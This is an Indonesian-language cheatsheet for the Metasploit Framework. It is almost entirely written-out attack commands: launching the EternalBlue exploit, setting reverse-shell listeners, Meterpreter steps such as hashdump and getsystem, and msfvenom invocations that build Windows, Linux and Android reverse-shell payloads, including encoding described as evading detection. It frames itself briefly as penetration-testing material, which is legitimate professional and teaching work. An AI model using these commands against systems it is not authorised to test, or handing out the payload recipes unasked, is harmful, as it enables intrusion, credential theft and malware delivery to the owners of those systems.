# 🐉 Ultimate Metasploit Framework Cheatsheet

Panduan praktis dan ringkasan lengkap penggunaan **Metasploit Framework** (MSF) untuk pengujian penetrasi (*penetration testing*), audit keselamatan sistem, pembuatan *payload*, dan eksploitasi kerentanan.

---

## 📋 Daftar Isi
1. [Pengenalan & Konsol Utama (`msfconsole`)](#1-pengenalan--konsol-utama-msfconsole)
2. [Perintah Manajemen Sesi & Modul](#2-perintah-manajemen-sesi--modul)
3. [Informasi Target & Pemindaian (Reconnaissance)](#3-informasi-target--pemindaian-reconnaissance)
4. [Proses Eksploitasi (Exploitation)](#4-proses-eksploitasi-exploitation)
5. [Penggunaan Post-Exploitation & Meterpreter](#5-penggunaan-post-exploitation--meterpreter)
6. [Pembuatan Payload dengan MSFVenom](#6-pembuatan-payload-dengan-msfvenom)
7. [Manajemen Database & Workspace](#7-manajemen-database--workspace)
8. [Tabel Referensi Opsi / Command Populer](#8-tabel-referensi-opsi--command-populer)

---

## 1. Pengenalan & Konsol Utama (`msfconsole`)

`msfconsole` adalah antarmuka utama berbasis teks (*command line interface*) untuk mengakses seluruh fitur Metasploit.

### 🔹 Membuka Konsol Metasploit
```bash
msfconsole
```

### 🔹 Membuka Konsol Tanpa Banner (`-q`)
```bash
msfconsole -q
```
* **`-q`**: Mode senyap (*quiet mode*), menyembunyikan logo/banner startup agar loading konsol lebih cepat.

### 🔹 Menjalankan Perintah / Resource Script Langsung (`-r` / `-x`)
```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; run"
```
* **`-x`**: Mengeksekusi sekumpulan perintah Metasploit secara otomatis saat konsol dibuka.

---

## 2. Perintah Manajemen Sesi & Modul

### 🔹 Mencari Modul (`search`)
```text
msf6 > search type:exploit platform:windows smb
```
* **`search`**: Mencari modul berdasarkan kata kunci, tipe (`exploit`, `auxiliary`, `post`), platform, atau nama protokol.

### 🔹 Memilih Modul (`use`)
```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```
* **`use <nama_modul>`**: Memilih dan berpindah ke lingkungan kerja modul tertentu.

### 🔹 Menampilkan Informasi & Opsi Modul (`info` & `show options`)
```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > info
```
* **`show options`**: Menampilkan daftar variabel/parameter yang wajib atau opsional untuk diatur sebelum menjalankan modul.
* **`info`**: Menampilkan rincian penjelasan, kerentanan terkait (CVE), dan batasan modul.

---

## 3. Informasi Target & Pemindaian (Reconnaissance)

Metasploit menyediakan modul tipe `auxiliary` untuk pemindaian dan pengumpulan informasi target.

### 🔹 Pemindaian Port TCP
```text
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 80,443,445
msf6 auxiliary(scanner/portscan/tcp) > run
```
* **`RHOSTS`**: Menentukan IP target, rentang IP, atau subnet CIDR.
* **`PORTS`**: Menentukan nomor port yang akan dipindai.

### 🔹 Pemindaian Kerentanan SMB (EternalBlue Test)
```text
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.50
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

---

## 4. Proses Eksploitasi (Exploitation)

### 🔹 Mengatur Parameter Utama (`set` & `setg`)
```text
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444
```
* **`set RHOSTS`**: Mengatur IP target (*Remote Host*).
* **`set LHOST`**: Mengatur IP lokal Anda (*Local Host*) tempat *payload* akan mengirim koneksi balik (*reverse shell*).
* **`set LPORT`**: Mengatur port lokal untuk mendengarkan koneksi masuk.
* **`setg`**: Mengatur variabel secara global agar bernilai sama di seluruh modul lain dalam satu sesi konsol.

### 🔹 Menentukan Payload (`set PAYLOAD`)
```text
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
* **`PAYLOAD`**: Menentukan jenis *payload* atau agen yang akan dikirimkan ke target setelah eksploitasi berhasil.

### 🔹 Menjalankan Eksploitasi (`exploit` / `run`)
```text
msf6 exploit(...) > exploit -j
```
* **`exploit`** / **`run`**: Mengeksekusi proses serangan.
* **`-j`**: Menjalankan eksploitasi sebagai pekerjaan latar belakang (*background job*).

---

## 5. Penggunaan Post-Exploitation & Meterpreter

Meterpreter adalah *payload* tingkat lanjut yang berjalan secara *in-memory* di sistem target.

### 🔹 Perintah Dasar Meterpreter
```text
meterpreter > sysinfo         # Menampilkan informasi OS dan arsitektur target
meterpreter > getuid          # Menampilkan identitas pengguna (user privilege) saat ini
meterpreter > ps              # Menampilkan daftar proses yang sedang berjalan
meterpreter > hashdump        # Memunculkan hash kata sandi pengguna (membutuhkan privilege administrator)
meterpreter > shell           # Membuka Command Prompt / Bash shell standar target
meterpreter > background      # Menyimpan sesi Meterpreter aktif ke latar belakang
```

### 🔹 Manajemen Sesi
```text
msf6 > sessions -l
msf6 > sessions -i 1
```
* **`sessions -l`**: Menampilkan daftar seluruh sesi yang aktif.
* **`sessions -i <ID>`**: Berpindah dan berinteraksi kembali dengan nomor sesi tertentu.

---

## 6. Pembuatan Payload dengan MSFVenom

`msfvenom` digunakan untuk membuat file *payload* independen (Executable, APK, DLL, dll) tanpa perlu membuka `msfconsole`.

### 🔹 Format Perintah Utama MSFVenom
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <NAMA_FILE>
```

### 🔹 Contoh Windows Executable (`.exe`)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
```
* **`-p`**: Menentukan jenis *payload*.
* **`-f`**: Format berkas keluaran (`exe`, `elf`, `apk`, `raw`, `asp`, `php`, dll).
* **`-o`**: Menentukan nama file output.

### 🔹 Contoh Linux ELF Executable (`.elf`)
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf
```

### 🔹 Contoh Android Application (`.apk`)
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk
```

### 🔹 Menghindari Deteksi Sederhana / Encoding (`-e` & `-i`)
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```
* **`-e`**: Mengatur jenis enkoder (*encoder*).
* **`-i`**: Jumlah iterasi pengodean ulang (semakin tinggi, semakin acak pola biner).

---

## 7. Manajemen Database & Workspace

Metasploit dapat terhubung dengan PostgreSQL untuk menyimpan data hasil pemindaian dan target.

### 🔹 Mengelola Workspace
```text
msf6 > workspace -a project_a   # Membuat workspace baru bernama project_a
msf6 > workspace project_a      # Pindah ke workspace project_a
msf6 > workspace -d project_a   # Menghapus workspace project_a
```

### 🔹 Menampilkan Data Terimpan
```text
msf6 > hosts                    # Menampilkan daftar IP target yang tersimpan
msf6 > services                 # Menampilkan daftar port/layanan yang terbuka pada target
msf6 > creds                    # Menampilkan daftar kredensial/hash yang berhasil didapatkan
```

---

## 8. Tabel Referensi Opsi / Command Populer

| Perintah / Flag | Lingkungan | Fungsi / Deskripsi |
| :--- | :--- | :--- |
| `use` | MSFConsole | Memilih modul yang akan digunakan |
| `search` | MSFConsole | Mencari modul berdasarkan kata kunci/CVE |
| `show options` | MSFConsole | Menampilkan parameter konfigurasi modul |
| `set` / `unset` | MSFConsole | Mengatur atau menghapus nilai dari variabel |
| `setg` | MSFConsole | Mengatur variabel secara global di seluruh modul |
| `run` / `exploit`| MSFConsole | Menjalankan modul eksploitasi atau auxiliary |
| `sessions` | MSFConsole | Mengelola dan berinteraksi dengan sesi aktif |
| `sysinfo` | Meterpreter | Menampilkan informasi sistem operasi target |
| `getsystem` | Meterpreter | Menguji eskalasi hak akses otomatis ke `SYSTEM` |
| `hashdump` | Meterpreter | Mengambil hash kredensial kata sandi lokal |
| `-p` | MSFVenom | Menentukan jenis *payload* |
| `-f` | MSFVenom | Menentukan format output file payload |
| `-e` | MSFVenom | Menentukan jenis encoder payload |
| `-i` | MSFVenom | Jumlah iterasi proses encoding |
| `-o` | MSFVenom | Menyimpan hasil pembuatan payload ke file |

---